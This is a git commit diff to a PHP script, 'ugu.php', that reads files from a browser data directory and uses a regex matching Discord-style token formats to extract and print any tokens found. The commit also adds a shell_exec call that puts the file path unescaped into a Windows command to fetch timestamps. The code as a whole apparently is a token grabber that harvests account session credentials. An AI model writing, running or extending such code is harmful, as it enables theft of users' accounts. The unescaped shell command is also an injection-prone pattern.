42018de2f91de3ea6c9572315ff62bec012e3462
padero <68622956+shidemuri@users.noreply.github.com>
2024-03-12 14:55:08 -0300

    Update ugu.php

--- ugu.php
+++ ugu.php
@@ -14,9 +14,12 @@
             foreach($cuh as $ii => $dbfile) {
                 $data = file_get_contents($chrome . '\\' . $dbfile);
                 #echo preg_match_all("/[\w-]{24}\.[\w-]{6}\.[\w-]{27}/",$data);
-                if(preg_match_all("/[\w-]{24}\.[\w-]{6}\.[\w-]{27}/",$data) > 0){
-                    echo '<h1> ' . $chrome . '\\' . $dbfile . ' </h1>';
-                    foreach(preg_grep("/[\w-]{24}\.[\w-]{6}\.[\w-]{27}/",$data) as $iii => $token){
+                preg_match_all("/[\w-]{24}\.[\w-]{6}\.[\w-]{27}/",$data,$ugu);
+                if(count($ugu[0]) > 0){;
+                    echo '<h2> ' . $chrome . '\\' . $dbfile . ' </h2>';
+                    preg_match("/(\d{2}\/){2}\d{4}\s\d{2}:\d{2}/",shell_exec('for %A in ("' . $chrome . '\\' . $dbfile . '") do echo %~tA'),$guhh);
+                    echo '<h3> ' . $guhh[0] . '</h3>';
+                    foreach($ugu[0] as $iii => $token){
                         echo "<p> " . $token . " </p>";
                     };
                 };
